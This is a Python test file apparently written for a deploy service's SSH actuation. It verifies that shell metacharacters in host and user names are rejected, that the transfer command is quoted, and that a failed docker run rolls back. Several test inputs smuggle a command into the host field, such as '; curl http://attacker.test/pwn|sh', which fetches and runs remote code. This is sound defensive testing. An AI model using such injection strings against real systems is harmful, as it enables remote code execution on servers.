"""Critical safety tests for governed SSH deploy actuation (Phase 2/3).

Covers:
  1. Host/user shell-metacharacter rejection (prevents local RCE via shell=True tar|ssh).
  2. Transfer pipeline shell-quotes user@host so injection cannot reach /bin/sh.
  3. docker-run failure after `docker rm -f` restores the previous build (no silent outage).
"""
from __future__ import annotations

import shlex
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import MagicMock

import pytest

from apps.api.app.services import deploy_service as ds
from boss_engine.services import preview_service


def test_validate_ssh_target_rejects_shell_metacharacters():
    ds._validate_ssh_target("example.com", "root")  # ok
    ds._validate_ssh_target("10.0.0.5", "deploy")
    ds._validate_ssh_target("2001:db8::1", "ubuntu")

    for host in (
        "example.com; curl evil.test|sh",
        "example.com$(id)",
        "example.com`id`",
        "example.com|reboot",
        "example.com && reboot",
        "example.com\nreboot",
        "",
        "<HOST>",
    ):
        with pytest.raises(ValueError, match="invalid deploy host"):
            ds._validate_ssh_target(host, "root")

    for user in ("root;id", "root$(id)", "root`id`", "root|x", "", "root bar"):
        with pytest.raises(ValueError, match="invalid deploy user"):
            ds._validate_ssh_target("example.com", user)


def test_transfer_shell_cmd_quotes_user_host_so_injection_cannot_reach_shell():
    """Regression: unquoted {user}@{host} in shell=True let `;` / `$()` run on the API host."""
    cmd = ds._transfer_shell_cmd(
        work=Path("/tmp/boss-deploy-abc"),
        key_path="/tmp/key.pem",
        host="evil.com;id",
        user="root",
        ssh_port=22,
        remote="/opt/boss-apps/demo",
    )
    # Metacharacter host must be a single shell-quoted token, or `;id` runs on the API host.
    assert shlex.quote("root@evil.com;id") in cmd
    assert cmd.count(";") == 1  # only inside the quoted destination, not a bare shell separator
    # Benign destinations may be unquoted by shlex (no metacharacters) — still present as one token.
    benign = ds._transfer_shell_cmd(
        work=Path("/tmp/boss-deploy-abc"),
        key_path="/tmp/key.pem",
        host="app.example.com",
        user="deploy",
        ssh_port=2222,
        remote="/opt/boss-apps/demo",
    )
    assert shlex.quote("deploy@app.example.com") in benign
    assert "-p 2222" in benign


def test_deploy_ssh_rejects_malicious_host_before_any_subprocess(monkeypatch):
    settings = SimpleNamespace(
        boss_edition="enterprise_self_hosted",
        ssh_host_deploy_allowed=True,
        ssh_host_private_key="-----BEGIN KEY-----\nabc\n-----END KEY-----",
    )
    ran = {"n": 0}

    def boom(*_a, **_k):
        ran["n"] += 1
        raise AssertionError("subprocess must not run for an invalid host")

    monkeypatch.setattr(ds.subprocess, "run", boom)
    monkeypatch.setattr(ds.owned_process, "run", boom)  # every deploy process goes through here
    monkeypatch.setattr(ds, "load_code_task_run", lambda *_a, **_k: {"id": "r1", "project_id": "p1"})
    monkeypatch.setattr(ds, "begin", MagicMock)

    with pytest.raises(ValueError, match="invalid deploy host"):
        ds.deploy_ssh(
            engine=object(), settings=settings, run_id="r1",
            host="x.com; curl http://attacker.test/pwn|sh", user="root",
        )
    assert ran["n"] == 0


def test_docker_run_failure_rolls_back_previous_build(monkeypatch):
    """After docker rm -f removes the live container, a failed docker run must restore dist.prev."""
    settings = SimpleNamespace(
        boss_edition="enterprise_self_hosted",
        ssh_host_deploy_allowed=True,
        ssh_host_private_key="-----BEGIN KEY-----\nabc\n-----END KEY-----",
        github_token="",
        target_github_owner="acme",
        target_github_repo="demo-app",
    )
    run = {
        "id": "run-1",
        "project_id": "proj-1",
        "spec": {"owner": "acme", "repo": "demo-app"},
        "finalize_ctx": {"work_branch": "boss/code/run-1"},
    }
    monkeypatch.setattr(ds, "load_code_task_run", lambda *_a, **_k: run)
    monkeypatch.setattr(ds, "begin", MagicMock())
    monkeypatch.setattr(ds, "emit_event", MagicMock())
    monkeypatch.setattr(
        ds,
        "_build_dist",
        lambda *_a, **_k: (Path("/tmp/boss-deploy-fake"), "static", "", "abc123"),
    )
    monkeypatch.setattr(ds.time, "sleep", lambda *_a, **_k: None)
    monkeypatch.setattr(ds.shutil, "rmtree", lambda *_a, **_k: None)
    monkeypatch.setattr(ds.os, "unlink", lambda *_a, **_k: None)
    # Keep key-file creation from touching a real pem with secrets logic — stub it.
    monkeypatch.setattr(ds, "_ssh_key_file", lambda _s: "/tmp/fake-key.pem")

    ssh_cmds: list[str] = []
    shell_cmds: list[str] = []

    def fake_ssh(key_path, host, user, port, command, timeout=180):
        ssh_cmds.append(command)
        # 1 connection test ok; 2 stage ok; 3 docker run FAIL; later rollback ok
        if command.startswith("docker version"):
            return SimpleNamespace(returncode=0, stdout="24.0", stderr="")
        if "mkdir -p" in command and "dist.prev" in command:
            return SimpleNamespace(returncode=0, stdout="", stderr="")
        if command.startswith("docker rm -f"):
            return SimpleNamespace(returncode=1, stdout="", stderr="port already allocated")
        if "dist.prev" in command or "docker restart" in command or "docker run -d" in command:
            return SimpleNamespace(returncode=0, stdout="", stderr="")
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    def fake_run(*args, **kwargs):
        if kwargs.get("shell"):
            shell_cmds.append(args[0] if args else "")
            return SimpleNamespace(returncode=0, stdout="", stderr="")
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    monkeypatch.setattr(ds, "_ssh", fake_ssh)
    monkeypatch.setattr(ds.subprocess, "run", fake_run)
    monkeypatch.setattr(ds.owned_process, "run", fake_run)  # the tar|ssh transfer runs here
    # File-lineage resolution has its own database contract. This test isolates the
    # post-transfer rollback guarantee and supplies a deterministic build input.
    monkeypatch.setattr(preview_service, "lineage_impl_files", lambda *_args: [])

    with pytest.raises(RuntimeError, match="docker run failed"):
        ds.deploy_ssh(
            engine=object(), settings=settings, run_id="run-1",
            host="apps.example.com", user="root", app_port=8080,
        )

    # Rollback must re-create/restart the container from dist.prev — not leave the site dark.
    rollback_cmds = [c for c in ssh_cmds if "dist.prev" in c and "docker" in c]
    assert rollback_cmds, f"expected rollback ssh command, got: {ssh_cmds}"
    assert any("docker run -d" in c or "docker restart" in c for c in rollback_cmds)
    assert shell_cmds, "transfer pipeline should have run before docker deploy"
